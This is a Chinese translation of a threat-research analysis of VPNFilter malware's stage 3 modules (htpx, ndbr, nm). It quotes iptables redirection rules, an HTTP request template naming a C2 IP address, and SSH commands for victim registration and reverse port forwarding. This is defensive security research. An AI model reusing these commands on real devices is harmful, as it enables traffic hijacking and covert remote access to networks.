本文翻译自：  
* * *
# 总结
VPNFilter是一款多阶段、模块化的框架，感染了全球上百万的网络设备。Cisco
Taols团队曾对VPNFilter恶意软件进行分析 。
近期，该团队研究任意发现了7个额外的stage 3模块，这些模块给恶意软件增加了新的功能，这些模块包括：
  * 对网络和VPNFilter入侵的设备的终端系统进行映射；
  * 多种混淆和加密恶意浏览的方式，包括用于C2的通信和数据泄露；
  * 用来识别潜在受害者的工具；
  * 构建分布式代理网络，用于未来不相关的攻击。
# 额外的stage 3模块
Talos共发现为VPNFilter提供扩展功能的7个模块：
下面一一对这些模块进行分析。
## htpx
`htpx`是VPNFilter stage
3的模块。该模块于`ssler`模块有许多代码是相同的。该模块严重依赖开源库，所以可以基于二进制文件中的字符串追踪原来的项目。比如libiptc.c就是Netfilter的一部分。
Htpx（左）与ssler（右）的字符串比较
Htpx模块中的主要函数负责设定iptable规则来转发TCP
80端口的流量到运行在8888端口上的本地服务器。重定向首先要加载允许进行流量管理的内核模块。这些模块（Ip_tables.ko,
Iptable_filter.ko, Iptable_nat.ko）都用insmod shell命令进行加载。
然后htpx模块会用下面的命令来转发流量：
    iptables -I INPUT -p tcp --dport 8888 -j ACCEPT
    iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8888
还需要周期性地通过删除命令并重新添加来确保规则规则存在，同时会创建一个名为/var/run/htpx.pid的临时文件。
然后回生成下面的HTTP请求：
    GET %s HTTP/1.1\r\nHost: 103.6.146.194\r\nAccept: */*\r\nUser-Agent: curl53\r\n\r\n
分析htpx模块时，研究任意发现不能嗅探来自C2基础设施的响应，所以不能观察其他的模块动作。在分析模块的二进制文件时，研究人员发现该模块回检查HTTP通信来识别是否存在Windows可执行文件。如果有，就标记该可执行文件并添加到表中。研究人员认为攻击者可以利用该模块来下载二进制payload并对Windows可执行文件进行动态打补丁。
## ndbr（多功能SSH工具）
Ndbr是一个有SSH功能的模块，可以进行端口扫描。该模块是dbmulti 工具（2017.75版本）的修改版，并使用dropbear
SSH服务器和客户端。研究人员发现了对标准dropbear功能的一些修改。
第一个修改是针对dbmulti工具，该工具可以作为SSH客户端或SSH服务器用SCP、生成key、转换key等方式进行数据传输。具体功能是根据程序名或传递给程序的第一个参数决定的。Ndbr模块用网络映射和ndbr替换了生成和转化key的功能。
与dbmulti工具类似，ndbr模块的功能依赖程序名或传递给程序的第一个参数，ndbr模块接收的参数包括dropbear, dbclient, ssh,
scp, ndbr, nmap。
### dropbear
Dropbear命令使ndbr模块以SHH服务器运行。Dropbear代码用默认是SSH端口（TCP22端口）来监听连接。Ndbr模块中将默认端口修改为63914。
ndbr模块将默认keyfile路径修改为/db_key，并用buf_readfile dropbear函数来加载适当的key。
Dropbear服务器使用的是基于密码的认证，而ndbr中将认证方式修改为基于合适的公钥。修改后的代码中存在一个bug，在处理尝试使用不正确的公钥时回出错。认证失败会使nbdr
SSH服务器陷入无限循环，而客户端并没有认证失败的提示。
### dbclient (ssh)
如果传递dbclient或ssh参数，ndbr模块就会作为标准的dropbear
SSH命令行用户接口客户端。对dropbear服务器命令的默认keyfile来说，dbclient/ssh命令有默认的身份文件：/cli_key。目前还不清楚要连接的dbclient（SSH客户端）。
### nmap
如果传递的是nmap参数，nbdr模块就会对IP或IP段执行端口扫描。具体使用方法是：
    Usage %s -ip*  -p*  -noping  -tcp  -s  -h/--help (print this help)
### ndbr
如果传递的是ndbr参数，ndbr模块就会基于传递的其他参数执行以下三种行动之一。SSH命令会用默认的key（比如`/db_key`或`/cli_key`）。
第三个参数必须以`start`开头，nbdr模块也可能卸载自己。
如果nbdr以下面的参数执行：
    $ ./ndbr_ ndbr   "start proxy  "
就会执行下面的dropbear SSH命令：  
`ssh -y -p  prx@ srv_ping j()_ `  
这会让dropbear SSH客户端连接到远程主机，然后发布srv_ping命令，该命令好像是用于在c2服务器上对受害者进行注册。
如果nbdr以下面的参数执行：
    $ ./ndbr_ ndbr   "start -l "
dropbear SSH服务器就会启动并开始监听指定的端口：  
`sshd -p `
如果nbdr以下面的参数执行：  
`$ ./ndbr_ ndbr   "start   "`
就会执行下面的dropbear命令来设置远程端口转发：  
`ssh -N -T -y -p  -R :127.0.0.1:63914 @`
## nm
Nm模块用于扫描和映射本地子网。会通过对子网上所有主机进行ARP扫描，并重复所有端口。一旦接收到ARP回复消息，nm就会发送一个ICMP
echo请求到发现的主机。如果主机接收到ICMP echo请求，就会通过端口扫描和尝试连接到远程TCP端口`9, 21, 22, 23, 25, 37,
42, 43, 53, 69, 70, 79, 80, 88, 103, 110, 115, 118, 123, 137, 138, 139, 143,
150, 156, 161, 190, 197, 389, 443, 445, 515, 546, 547, 569, 3306, 8080,
8291`来继续子网映射。
然后用MikroTik Network Discovery Protocol
(MNDP)来定位其他本地网络中的MikroTik设备。如果有MikroTik设备回复MNDP
ping，nm会提取出MAC地址、系统身份、版本号、平台类型、上线时间、RouterOS软件ID、RouterBoard型号和接口名。
Nm模块好像是通过/proc/net/arp获取受感染设备的APR表信息的。然后收集/proc/net/wireless的内容。
模块首先会创建一个到8.8.8.8:53的TCP连接来执行traceroute以确认可达性，然后重复向该IP地址发送TTL递增的ICMP echo请求。